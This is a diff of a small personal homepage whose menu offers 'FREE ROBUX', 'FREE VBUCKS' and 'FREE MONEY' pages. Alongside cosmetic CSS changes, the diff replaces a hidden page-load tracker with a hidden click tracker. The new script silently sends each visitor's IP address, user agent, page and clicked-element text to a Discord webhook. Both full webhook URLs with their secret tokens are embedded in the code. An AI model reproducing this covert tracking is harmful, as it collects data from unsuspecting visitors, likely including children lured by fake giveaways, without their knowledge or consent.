@@ -6,8 +6,8 @@
   <link rel="icon" href="/favicon.ico">
   <meta charset="UTF-8">
   <title>Silvan's Website</title>
+
   <style>
-    /* Grundlayout */
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(135deg, #a1c4fd 0%, #c2e9fb 100%);
@@ -27,36 +27,25 @@
       margin-bottom: 10px;
       color: #1b2a49;
       text-shadow: 1px 1px 5px rgba(0,0,0,0.1);
-      animation: fadeInDown 1s ease forwards;
-      opacity: 0;
     }
 
     p {
       font-size: 1.3em;
       margin-bottom: 50px;
       color: #2c3e50;
-      animation: fadeInDown 1.2s ease forwards;
-      opacity: 0;
     }
 
-    /* Menü-Container */
     #menu {
       display: flex;
       flex-wrap: wrap;
       justify-content: center;
       gap: 25px;
-      padding: 0;
-      margin: 0;
       list-style: none;
+      padding: 0;
     }
 
-    /* Karten-Style für jeden Button */
     #menu li {
-      flex: 1 1 200px;
       max-width: 220px;
-      opacity: 0;
-      transform: translateY(30px);
-      animation: fadeInUp 0.8s ease forwards;
     }
 
     #menu a {
@@ -69,78 +58,42 @@
       font-weight: bold;
       font-size: 1.2em;
       border-radius: 20px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-      transition: all 0.4s ease;
+      transition: 0.3s;
     }
 
     #menu a:hover {
-      background: linear-gradient(145deg, #2980b9, #3498db);
-      transform: translateY(-8px) scale(1.05);
-      box-shadow: 0 15px 25px rgba(0,0,0,0.3);
+      transform: scale(1.05);
     }
 
-    /* Footer optional */
     footer {
       margin-top: 60px;
       font-size: 0.9em;
-      color: #1b2a49;
-      opacity: 0;
-      animation: fadeInUp 1.5s ease forwards;
-    }
-
-    /* Animations */
-    @keyframes fadeInDown {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* Staggered animation for menu items */
-    #menu li:nth-child(1) { animation-delay: 1.5s; }
-    #menu li:nth-child(2) { animation-delay: 1.7s; }
-    #menu li:nth-child(3) { animation-delay: 1.9s; }
-    #menu li:nth-child(4) { animation-delay: 2.1s; }
-    #menu li:nth-child(5) { animation-delay: 2.3s; }
-
-    /* Responsive */
-    @media(max-width: 600px){
-      h1 { font-size: 2.5em; }
-      p { font-size: 1.1em; margin-bottom: 30px; }
-      #menu li { max-width: 100%; }
     }
   </style>
 </head>
+
 <body>
   <h1>Welcome to Silvan's Website!</h1>
   <p>Choose a page from the menu:</p>
-  
-  <ul id="menu">
-    <!-- Dynamisches Menü via JavaScript -->
-  </ul>
 
-  <footer>
-    &copy; 2026 Silvan
-  </footer>
+  <ul id="menu"></ul>
+
+  <footer>&copy; 2026 Silvan</footer>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1457062538872357049/cjJv72Z6peKGCHFReLndx5sYUpPcXYFsQtmXabB__xa5v94o82_fk0snRGmXKjMCXs19";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1457349541094490217/pBaDH8FZMP2ZJJj19Ia4MBmdwvqOWaYXowuwvL8rGeFiSCeGSU9mah_M2kgXSAN-CYTJ";
 
-    // Unterseiten definieren
     const unterseiten = [
       { name: "Cloud", folder: "/cloud/index.html" },
       { name: "FREE ROBUX", folder: "/freerobux/" },
       { name: "FREE VBUCKS", folder: "/freevbucks/" },
       { name: "FREE MONEY", folder: "/freemoney/" },
-      { name: "MCMODS/PLUGINS", folder: "/plugins/" },
+      { name: "MCMODS/PLUGINS", folder: "/plugins/" }
     ];
 
     const menu = document.getElementById("menu");
 
-    unterseiten.forEach((seite, index) => {
+    unterseiten.forEach(seite => {
       const li = document.createElement("li");
       const link = document.createElement("a");
       link.href = seite.folder;
@@ -149,32 +102,44 @@
       menu.appendChild(li);
     });
 
-    // --- TRACKING BEIM LADEN DER SEITE ---
-    window.addEventListener("load", () => {
-      fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(ipData => {
-          const payload = {
-            ip: ipData.ip,
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString(),
-            page: window.location.href,
-            referrer: document.referrer || "direct"
-          };
-          fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              content:
-`Page Loaded
-IP: ${payload.ip}
-User-Agent: ${payload.userAgent}
-Time: ${payload.timestamp}
-Page: ${payload.page}
-From: ${payload.referrer}`
-            })
-          });
-        });
+    /* -------------------------------
+       TRACKING (METHODE 2)
+    -------------------------------- */
+
+    let cachedIP = "unknown";
+    let lastSend = 0;
+    const COOLDOWN = 250; // 0.25 Sekunden
+
+    // IP EINMALIG holen
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => cachedIP = data.ip)
+      .catch(() => cachedIP = "ip_unavailable");
+
+    document.addEventListener("click", (e) => {
+      const now = Date.now();
+      if (now - lastSend < COOLDOWN) return;
+      lastSend = now;
+
+      const elementText =
+        e.target.innerText?.trim().slice(0, 100) ||
+        e.target.value ||
+        e.target.tagName;
+
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content:
+`Click detected
+Page: ${location.href}
+Element: ${e.target.tagName}
+Text: ${elementText}
+UserAgent: ${navigator.userAgent}
+IP: ${cachedIP}
+Time: ${new Date().toISOString()}`
+        })
+      });
     });
   </script>
 </body>
